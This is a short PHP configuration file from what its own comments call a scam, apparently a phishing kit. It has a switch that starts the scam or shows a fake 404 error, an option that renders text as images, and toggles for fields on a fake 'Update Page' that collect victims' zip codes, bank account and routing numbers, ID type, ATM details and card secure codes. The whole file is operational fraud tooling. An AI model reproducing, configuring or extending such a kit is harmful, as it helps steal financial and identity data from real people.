<?php
if (!isset($_SESSION)) {
  session_start();
}
$_SESSION['MessageOFF']="Erreur 404<br>";
//this is the best Option for this scam ,please Change anything
$start=true;
//true :start the scam
//false : show erreur 404
//__________________________________________________________________________________________________

$convertimage=true;
//true to coverting text to image


//=====> Scam Option for labels of Update Page <=====

$zipcode=true;
//true : for show Zip code label ,false :for hidden
//-------------------------------------------------------------------------------------
$bkA=false;
//true : for show Bank Account Number label ,false :for hidden
//-------------------------------------------------------------------------------------
$bkR=false;
//true : for show Bank Routing Number label ,false :for hidden
//-------------------------------------------------------------------------------------//
$typeid=false;
//true : for show Select type of Id label ,false :for hidden
//-------------------------------------------------------------------------------------
$atmO=false;
//true : for show ATM label ,false :for hidden
//-------------------------------------------------------------------------------------
$securcode=true;
//true : for show Secure Code label ,false :for hidden
//-------------------------------------------------------------------------------------

?>